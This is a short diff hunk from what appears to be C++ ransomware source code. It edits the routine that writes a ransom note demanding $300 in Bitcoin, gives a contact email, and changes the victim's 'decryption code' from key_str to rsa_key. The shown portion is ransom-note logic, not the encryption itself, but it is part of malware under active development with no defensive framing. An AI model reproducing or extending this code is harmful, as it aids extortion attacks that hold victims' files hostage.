@@ -151,7 +151,7 @@ int main(int argc, char** argv) {
           "\nHow to get the key\n"
           "\n"
           "    Send 300$ Bitcoin to this address [Wallet Address]. (You can buy Bitcoin here)\n"
-          "    Send email to this address [myemail@email.com] your transaction ID, your email address and your decryption code [" << key_str << "]. You will get an email with the key to decrypt after 12 - 48 hours.\n"
+          "    Send email to this address [myemail@email.com] your transaction ID, your email address and your decryption code [" << rsa_key << "]. You will get an email with the key to decrypt after 12 - 48 hours.\n"
           "Your decrypt.exe program is in C:\\PerfLogs";
 
     fs.close();
